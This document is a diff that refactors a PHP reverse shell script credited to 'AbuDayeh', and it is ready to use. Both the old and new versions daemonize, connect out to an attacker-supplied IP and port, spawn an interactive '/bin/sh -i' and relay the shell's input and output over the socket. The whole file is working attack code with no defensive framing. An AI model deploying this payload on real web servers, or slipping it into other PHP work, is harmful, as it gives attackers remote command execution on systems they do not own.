@@ -1,95 +1,127 @@
 <?php
 // PHP Reverse Shell
-// Copyright (C) 2020 e@hotmail.com
+// Copyright (C) 2024 e@hotmail.com
 // AbuDayeh
-set_time_limit (0);
-$VERSION 	= "1.0";
-$ip 		= '127.0.0.1'; 	// Change Your {IP}
-$port 		= 1234;       	// Change Your {Port}
-$chunk_size 	= 1400;
-$write_a 	= null;
-$error_a 	= null;
-$shell 		= 'uname -a; w; id; /bin/sh -i';
-$daemon 	= 0;
-$debug 		= 0;
 
-if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	if ($pid) {
-		exit(0);
-	}
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+set_time_limit(0);
+$ip = '127.0.0.1'; // Change this to your IP address
+$port = 1234;      // Change this to your port
+$shell = 'uname -a; w; id; /bin/sh -i';
+$chunk_size = 1400;
+$daemon = 0;
+$debug = 0;
+
+/**
+ * Print a message if not in daemon mode
+ * @param string $string
+ */
+function printit($string)
+{
+    global $daemon;
+    if (!$daemon) {
+        echo "$string\n";
+    }
 }
+
+/**
+ * Try to daemonize the process
+ * @return bool
+ */
+function daemonize()
+{
+    if (function_exists('pcntl_fork')) {
+        $pid = pcntl_fork();
+        if ($pid == -1) {
+            printit("ERROR: Can't fork");
+            exit(1);
+        }
+        if ($pid) {
+            exit(0); // Parent exits
+        }
+        if (posix_setsid() == -1) {
+            printit("ERROR: Can't setsid()");
+            exit(1);
+        }
+        return true;
+    } else {
+        printit("WARNING: Failed to daemonize. This is quite common and not fatal.");
+        return false;
+    }
+}
+
+// Daemonize the process if possible
+$daemon = daemonize();
+
 chdir("/");
 umask(0);
+
+// Open the socket connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
+    printit("$errstr ($errno)");
+    exit(1);
 }
-$descriptorspec = array(
-   0 => array("pipe", "r"),
-   1 => array("pipe", "w"),
-   2 => array("pipe", "w")
-);
+
+// Define the descriptors for the process
+$descriptorspec = [
+    0 => ["pipe", "r"], // stdin
+    1 => ["pipe", "w"], // stdout
+    2 => ["pipe", "w"]  // stderr
+];
+
+// Spawn the shell process
 $process = proc_open($shell, $descriptorspec, $pipes);
 if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
+    printit("ERROR: Can't spawn shell");
+    exit(1);
 }
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
+
+// Set the streams to non-blocking mode
+foreach ($pipes as $pipe) {
+    stream_set_blocking($pipe, 0);
+}
 stream_set_blocking($sock, 0);
+
 printit("Successfully opened reverse shell to $ip:$port");
+
+// Main loop to handle communication
 while (1) {
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
+    if (feof($sock)) {
+        printit("ERROR: Shell connection terminated");
+        break;
+    }
+    if (feof($pipes[1])) {
+        printit("ERROR: Shell process terminated");
+        break;
+    }
+
+    $read_a = [$sock, $pipes[1], $pipes[2]];
+    $num_changed_sockets = stream_select($read_a, $write_a = null, $error_a = null, null);
+
+    if ($num_changed_sockets === false) {
+        printit("ERROR: stream_select failed");
+        break;
+    }
+
+    if (in_array($sock, $read_a)) {
+        $input = fread($sock, $chunk_size);
+        fwrite($pipes[0], $input);
+    }
+
+    if (in_array($pipes[1], $read_a)) {
+        $output = fread($pipes[1], $chunk_size);
+        fwrite($sock, $output);
+    }
+
+    if (in_array($pipes[2], $read_a)) {
+        $error_output = fread($pipes[2], $chunk_size);
+        fwrite($sock, $error_output);
+    }
 }
+
+// Clean up
 fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
+foreach ($pipes as $pipe) {
+    fclose($pipe);
 }
-?>
+proc_close($process);
